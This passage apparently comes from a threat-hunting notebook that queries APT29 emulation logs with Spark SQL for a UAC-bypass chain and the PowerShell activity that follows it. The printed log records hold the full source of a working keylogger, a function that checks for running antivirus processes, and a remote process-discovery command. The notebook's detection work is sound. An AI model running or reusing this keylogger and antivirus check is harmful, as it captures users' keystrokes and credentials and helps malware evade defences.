-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Get-Keystrokes {
&lt;#
.SYNOPSIS
 
    Logs keys pressed, time and the active window (when changed).
    Some modifications for Empire by @harmj0y.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Modifications: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.LINK
    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#&gt;
    Start-Job -Name &quot;Keystrokes&quot; -ScriptBlock {
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        [Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;) | Out-Null

        try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;Win32Lib&#39;)
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;Win32Lib&#39;, $False)
            $TypeBuilder = $ModuleBuilder.DefineType(&#39;User32&#39;, &#39;Public, Class&#39;)

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;EntryPoint&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;ExactSpelling&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;SetLastError&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;PreserveSig&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CallingConvention&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CharSet&#39;)
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetAsyncKeyState&#39;, &#39;Public, Static&#39;, [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                &#39;GetAsyncKeyState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetKeyboardState&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                &#39;GetKeyboardState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;MapVirtualKey&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                &#39;MapVirtualKey&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;ToUnicode&#39;, &#39;Public, Static&#39;, [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                &#39;ToUnicode&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetForegroundWindow&#39;, &#39;Public, Static&#39;, [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                &#39;GetForegroundWindow&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }

        $LastWindowTitle = &quot;&quot;
        $i=0
        while ($true) {
            Start-Sleep -Milliseconds 40
            $gotit = &quot;&quot;
            $Outout = &quot;&quot;
            
            for ($char = 1; $char -le 254; $char++) {
                $vkey = $char
                $gotit = $ImportDll::GetAsyncKeyState($vkey)
                
                if ($gotit -eq -32767) {

                    #check for keys not mapped by virtual keyboard
                    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if ($LeftShift -or $RightShift) {$Outout += &#39;[Shift]&#39;}
                    if ($LeftCtrl  -or $RightCtrl)  {$Outout += &#39;[Ctrl]&#39;}
                    if ($LeftAlt   -or $RightAlt)   {$Outout += &#39;[Alt]&#39;}
                    if ($TabKey)       {$Outout += &#39;[Tab]&#39;}
                    if ($SpaceBar)     {$Outout += &#39;[SpaceBar]&#39;}
                    if ($DeleteKey)    {$Outout += &#39;[Delete]&#39;}
                    if ($EnterKey)     {$Outout += &#39;[Enter]&#39;}
                    if ($BackSpaceKey) {$Outout += &#39;[Backspace]&#39;}
                    if ($LeftArrow)    {$Outout += &#39;[Left Arrow]&#39;}
                    if ($RightArrow)   {$Outout += &#39;[Right Arrow]&#39;}
                    if ($UpArrow)      {$Outout += &#39;[Up Arrow]&#39;}
                    if ($DownArrow)    {$Outout += &#39;[Down Arrow]&#39;}
                    if ($LeftMouse)    {$Outout += &#39;[Left Mouse]&#39;}
                    if ($RightMouse)   {$Outout += &#39;[Right Mouse]&#39;}

                    #check for capslock
                    if ([Console]::CapsLock) {$Outout += &#39;[Caps Lock]&#39;}

                    $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
                    
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
                    
                    $mychar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
                    $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                    #get the title of the foreground window
                    $TopWindow = $ImportDll::GetForegroundWindow()
                    $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                    
                    if ($unicode_res -gt 0) {
                        if ($WindowTitle -ne $LastWindowTitle){
                            # if the window has changed
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                            $Outout = &quot;`n`n$WindowTitle - $TimeStamp`n&quot;
                            $LastWindowTitle = $WindowTitle
                        }
                        $Outout += $mychar.ToString()
                        $Outout
                    }
                }
            }
        }
    }
}

ScriptBlock ID: fa9f2b3a-3f5e-4d3c-93c9-7172cc073add
Path: C:\Program Files\SysinternalsSuite\psversion.ps1 
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Keystroke-Check {
    Get-Process | Where-Object { $_.ProcessName -Eq &quot;avp&quot; -or $_.ProcessName -Eq &quot;acs&quot; -or $_.ProcessName -Eq &quot;outpost&quot; -or $_.ProcessName -Eq &quot;mcvsescn&quot; -or $_.ProcessName -Eq &quot;mcods&quot; -or $_.ProcessName -Eq &quot;navapsvc&quot; -or $_.ProcessName -Eq &quot;kav&quot; -or $_.ProcessName -Eq &quot;AvastSvc&quot; -or $_.ProcessName -Eq &quot;AvastUi&quot; -or $_.ProcessName -Eq &quot;nod32krn&quot; -or $_.ProcessName -Eq &quot;nod32&quot; -or $_.ProcessName -Eq &quot;ekern&quot; -or $_.ProcessName -Eq &quot;dwengine&quot; -or $_.ProcessName -Eq &quot;MsMpEng&quot; -or $_.ProcessName -Eq &quot;msseces&quot; -or $_.ProcessName -Eq &quot;ekrn&quot; -or $_.ProcessName -Eq &quot;savservice&quot; -or $_.ProcessName -Eq &quot;scfservice&quot; -or $_.ProcessName -Eq &quot;savadminservice&quot; }
}

ScriptBlock ID: a2a6be75-3568-4d81-a0ca-40a31de44589
Path: C:\Program Files\SysinternalsSuite\psversion.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
-RECORD 3-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
get-process

ScriptBlock ID: 66a7f650-8a84-4dcf-a0f7-41d06de51f5c
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:294DFB34-1FA8-464D-B85C-F2AE163DB4A9</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4104</span>
<span class="sd">    AND LOWER(f.ScriptBlockText) LIKE &quot;%get-process%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

ScriptBlock ID: 806f4593-7cce-4e2c-8645-8cb798c3bedd
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
